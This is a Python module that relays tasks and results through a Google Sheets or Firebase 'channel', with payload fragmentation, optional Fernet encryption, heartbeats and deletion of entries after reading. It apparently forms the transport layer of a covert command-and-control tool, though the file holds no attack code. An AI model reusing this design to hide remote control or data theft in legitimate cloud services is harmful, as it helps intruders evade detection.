import os


def load_env(path=".env"):
    """Parse .env file into os.environ and reset the active channel."""
    global _active_channel
    if not os.path.exists(path):
        return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            os.environ[key.strip()] = val.strip()
    _active_channel = None


def get_fragmenter():
    """Return the configured Fragmenter instance based on FRAGMENT_METHOD env var."""
    method = os.environ.get("FRAGMENT_METHOD", "passthrough").strip().lower()
    if method == "fixed":
        from fragmenter.fixed import FixedFragmenter
        return FixedFragmenter()
    from fragmenter.passthrough import PassthroughFragmenter
    return PassthroughFragmenter()


def get_encryptor():
    """Return the configured Encryptor instance based on ENCRYPTION_METHOD env var."""
    method = os.environ.get("ENCRYPTION_METHOD", "plaintext").strip().lower()
    if method == "fernet":
        from crypto.fernet import FernetEncryptor
        return FernetEncryptor()
    from crypto.plaintext import PlaintextEncryptor
    return PlaintextEncryptor()


def _encrypt_row(row, enc):
    """Encrypt all non-empty values in a row dict."""
    out = {}
    for k, v in row.items():
        if v:
            try:
                out[k] = enc.encrypt(str(v))
            except Exception:
                out[k] = v
        else:
            out[k] = v
    return out


def _decrypt_row(row, enc):
    """Decrypt all non-empty values in a row dict.
    Silently passes through values that fail decryption (e.g. legacy plaintext rows).
    """
    out = {}
    for k, v in row.items():
        if v:
            try:
                out[k] = enc.decrypt(v)
            except Exception:
                out[k] = v
        else:
            out[k] = v
    return out


def _reassemble_fragments(rows, data_field, done_status):
    """Detect frag: rows, reassemble complete sets, pass normal rows through.

    Fragment rows use status="frag:N:T" (N=index 0-based, T=total).
    Incomplete sets are silently dropped — they will reappear next full-tab read.
    Complete sets are returned as a single row with the full data_field value
    and status set to done_status.
    """
    normal = []
    frags = {}  # command_id -> {"total": int, "chunks": {index: chunk}, "meta": dict}

    for row in rows:
        status = row.get("status", "")
        if status.startswith("frag:"):
            parts = status.split(":")
            if len(parts) != 3:
                normal.append(row)
                continue
            try:
                idx, total = int(parts[1]), int(parts[2])
            except ValueError:
                normal.append(row)
                continue
            cid = row.get("command_id", "")
            if cid not in frags:
                frags[cid] = {"total": total, "chunks": {}, "meta": None}
            frags[cid]["chunks"][idx] = row.get(data_field, "")
            if frags[cid]["meta"] is None:
                frags[cid]["meta"] = {k: v for k, v in row.items()}
        else:
            normal.append(row)

    for cid, frag_data in frags.items():
        if len(frag_data["chunks"]) >= frag_data["total"]:
            chunks = [frag_data["chunks"][i] for i in range(frag_data["total"])]
            row = dict(frag_data["meta"])
            row[data_field] = "".join(chunks)
            row["status"] = done_status
            normal.append(row)
        # incomplete sets are silently dropped; full-tab read next cycle will retry

    return normal


# ---------------------------------------------------------------------------
# Channel registry
# ---------------------------------------------------------------------------

_active_channel = None


def get_channel():
    """Return the active channel, instantiating from CHANNEL env var if needed."""
    global _active_channel
    if _active_channel is None:
        method = os.environ.get("CHANNEL", "sheets").strip().lower()
        if method == "firebase":
            from channel.firebase import FirebaseChannel
            _active_channel = FirebaseChannel()
        else:
            from channel.sheets import SheetsChannel
            _active_channel = SheetsChannel()
    return _active_channel


def set_channel(channel):
    """Replace the active channel. Used for channel switching and testing."""
    global _active_channel
    _active_channel = channel


# ---------------------------------------------------------------------------
# Thin wrappers — delegate to active channel
# ---------------------------------------------------------------------------

def read_inbox():
    return get_channel().read_inbox()


def read_outbox():
    return get_channel().read_outbox()


def write_form(data):
    """Write a result to the outbox (delegates to channel.write_result)."""
    return get_channel().write_result(data)


def write_inbox_form(data):
    """Write a task to the inbox (delegates to channel.write_task)."""
    return get_channel().write_task(data)


def build_outbox_fragments(data, chunks):
    return get_channel().build_outbox_fragments(data, chunks)


def build_inbox_fragments(data, chunks):
    return get_channel().build_inbox_fragments(data, chunks)


def delete_task_entry(command_id: str) -> None:
    """Delete inbox and outbox entries after a result is confirmed, if the channel supports it."""
    ch = get_channel()
    if ch.supports_cleanup:
        ch.delete_task(command_id)
        ch.delete_result(command_id)


def delete_outbox_entry(command_id: str) -> None:
    """Delete a single outbox entry after it has been read and processed (e.g. heartbeats)."""
    ch = get_channel()
    if ch.supports_cleanup:
        ch.delete_result(command_id)
